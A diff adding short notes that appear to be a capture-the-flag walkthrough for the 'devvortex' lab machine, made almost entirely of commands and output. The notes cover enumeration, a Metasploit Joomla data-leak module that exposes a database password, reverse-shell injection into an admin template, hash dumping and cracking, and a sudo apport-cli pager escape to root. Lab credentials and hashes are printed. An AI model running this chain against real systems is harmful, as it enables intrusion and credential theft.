@@ -1,0 +1,200 @@
+> nmap -p- 10.10.11.242
+	Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-27 15:31 CET
+	Nmap scan report for 10.10.11.242
+	Host is up (0.056s latency).
+	Not shown: 65533 closed tcp ports (conn-refused)
+	PORT   STATE SERVICE
+	22/tcp open  ssh
+	80/tcp open  http
+
+	Nmap done: 1 IP address (1 host up) scanned in 26.59 seconds
+
+> gobuster vhost --append-domain -u devvortex.htb -w /usr/share/wordlists/dirb/big.txt -t 10 --retry
+	===============================================================
+	Gobuster v3.6
+	by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+	===============================================================
+	[+] Url:             http://devvortex.htb
+	[+] Method:          GET
+	[+] Threads:         10
+	[+] Wordlist:        /usr/share/wordlists/dirb/big.txt
+	[+] User Agent:      gobuster/3.6
+	[+] Timeout:         10s
+	[+] Append Domain:   true
+	===============================================================
+	Starting gobuster in VHOST enumeration mode
+	===============================================================
+	Found: dev.devvortex.htb Status: 200 [Size: 23221]
+	=============================================================== 
+	Finished 
+	=============================================================== 
+
+> gobuster dir -r -u dev.devvortex.htb -w /usr/share/wordlists/dirb/big.txt -b 404,403,406 -t 100
+	===============================================================
+	Gobuster v3.6
+	by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+	===============================================================
+	[+] Url:                     http://dev.devvortex.htb
+	[+] Method:                  GET
+	[+] Threads:                 100
+	[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
+	[+] Negative Status codes:   406,404,403
+	[+] User Agent:              gobuster/3.6
+	[+] Follow Redirect:         true
+	[+] Timeout:                 10s
+	===============================================================
+	Starting gobuster in directory enumeration mode
+	===============================================================
+	/administrator        (Status: 200) [Size: 12211]
+	/cache                (Status: 200) [Size: 31]
+	/cli                  (Status: 200) [Size: 31]
+	/components           (Status: 200) [Size: 31]
+	/home                 (Status: 200) [Size: 23221]
+	/images               (Status: 200) [Size: 31]
+	/includes             (Status: 200) [Size: 31]
+	/language             (Status: 200) [Size: 31]
+	/layouts              (Status: 200) [Size: 31]
+	/libraries            (Status: 200) [Size: 31]
+	/media                (Status: 200) [Size: 31]
+	/modules              (Status: 200) [Size: 31]
+	/plugins              (Status: 200) [Size: 31]
+	/robots.txt           (Status: 200) [Size: 764]
+	/templates            (Status: 200) [Size: 31]
+	/tmp                  (Status: 200) [Size: 31]
+	Progress: 20469 / 20470 (100.00%)
+	===============================================================
+	Finished
+	===============================================================
+
+> open robots.txt > joomla
+> msf6 auxiliary(scanner/http/joomla_api_improper_access_checks) > run
+	[+] Users JSON saved to /home/herrfalco/.msf4/loot/20231127174049_default_10.10.11.242_joomla.users_871489.bin
+	[+] Joomla Users
+	============
+
+	 ID   Super User  Name        Username  Email                Send Email  Register Date        Last Visit Date    Group Names
+	 --   ----------  ----        --------  -----                ----------  -------------        ---------------    -----------
+	 649  *           lewis       lewis     lewis@devvortex.htb  1           2023-09-25 16:44:24  2023-11-27 12:00:  Super Users
+												      32
+	 650              logan paul  logan     logan@devvortex.htb  0           2023-09-26 19:15:42                     Registered
+
+	[+] Config JSON saved to /home/herrfalco/.msf4/loot/20231127174049_default_10.10.11.242_joomla.config_260304.bin
+	[+] Joomla Config
+	=============
+
+	 Setting        Value
+	 -------        -----
+	 db encryption  0
+	 db host        localhost
+	 db name        joomla
+	 db password    P4ntherg0t1n5r3c0n##
+	 db prefix      sd4fg_
+	 db user        lewis
+	 dbtype         mysqli
+
+> connect with previous credentials at dev.devvortex.htb/administrator	
+> go to system -> administrator templates and inject a reverse shell in index.php
+
+> stabilize shell with python3 -c 'import pty; pty.spawn("/bin/bash")'
+> www-data@devvortex:~/dev.devvortex.htb/administrator$ mysql --user=lewis --password=P4ntherg0t1n5r3c0n## joomla
+
+	mysql> show databases
+		+--------------------+
+		| Database           |
+		+--------------------+
+		| information_schema |
+		| joomla             |
+		| performance_schema |
+		+--------------------+
+		3 rows in set (0.00 sec)
+
+	mysql> use joomla
+		Database changed
+
+	mysql> show tables;
+		+-------------------------------+
+		| Tables_in_joomla              |
+		+-------------------------------+
+		| sd4fg_action_log_config       |
+		| sd4fg_action_logs             |
+		| sd4fg_action_logs_extensions  |
+		| sd4fg_action_logs_users       |
+		| sd4fg_content_rating          |
+		| sd4fg_content_types           |
+		| sd4fg_contentitem_tag_map     |
+		| sd4fg_extensions              |
+		| sd4fg_fields                  |
+		...
+		| sd4fg_fields_categories       |
+		| sd4fg_fields_groups           |
+		| sd4fg_user_notes              |
+		| sd4fg_user_profiles           |
+		| sd4fg_user_usergroup_map      |
+		| sd4fg_usergroups              |
+		| sd4fg_users                   |
+		| sd4fg_viewlevels              |
+		| sd4fg_webauthn_credentials    |
+		| sd4fg_workflow_associations   |
+		| sd4fg_workflow_stages         |
+		| sd4fg_workflow_transitions    |
+		| sd4fg_workflows               |
+		+-------------------------------+
+		71 rows in set (0.01 sec)
+
+	mysql> describe sd4fg_users;
+		+---------------+---------------+------+-----+---------+----------------+
+		| Field         | Type          | Null | Key | Default | Extra          |
+		+---------------+---------------+------+-----+---------+----------------+
+		| id            | int           | NO   | PRI | NULL    | auto_increment |
+		| name          | varchar(400)  | NO   | MUL |         |                |
+		| username      | varchar(150)  | NO   | UNI |         |                |
+		| email         | varchar(100)  | NO   | MUL |         |                |
+		| password      | varchar(100)  | NO   |     |         |                |
+		| block         | tinyint       | NO   | MUL | 0       |                |
+		| sendEmail     | tinyint       | YES  |     | 0       |                |
+		| registerDate  | datetime      | NO   |     | NULL    |                |
+		| lastvisitDate | datetime      | YES  |     | NULL    |                |
+		| activation    | varchar(100)  | NO   |     |         |                |
+		| params        | text          | NO   |     | NULL    |                |
+		| lastResetTime | datetime      | YES  |     | NULL    |                |
+		| resetCount    | int           | NO   |     | 0       |                |
+		| otpKey        | varchar(1000) | NO   |     |         |                |
+		| otep          | varchar(1000) | NO   |     |         |                |
+		| requireReset  | tinyint       | NO   |     | 0       |                |
+		| authProvider  | varchar(100)  | NO   |     |         |                |
+		+---------------+---------------+------+-----+---------+----------------+
+		17 rows in set (0.00 sec)
+
+	mysql> SELECT username, password FROM sd4fg_users;
+		+----------+--------------------------------------------------------------+
+		| username | password                                                     |
+		+----------+--------------------------------------------------------------+
+		| lewis    | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |
+		| logan    | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |
+		+----------+--------------------------------------------------------------+
+		2 rows in set (0.00 sec)
+
+> hashcat -m 3200 pass.txt /usr/share/wordlists/rockyou.txt
+	$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12:tequieromucho
+
+> logan@devvortex:~$ sudo apport-cli -f -P 2317
+	*** Collecting problem information
+
+	The collected information can be sent to the developers to improve the
+	application. This might take a few minutes.
+	..................
+
+	*** Send problem report to the developers?
+
+	After the problem report has been sent, please fill out the form in the
+	automatically opened web browser.
+
+	What would you like to do? Your options are:
+	  S: Send report (7.2 KB)
+	  V: View report
+	  K: Keep report file for sending later or copying to somewhere else
+	  I: Cancel and ignore future crashes of this program version
+	  C: Cancel
+	Please choose (S/V/K/I/C): V
+
+> !/bin/bash
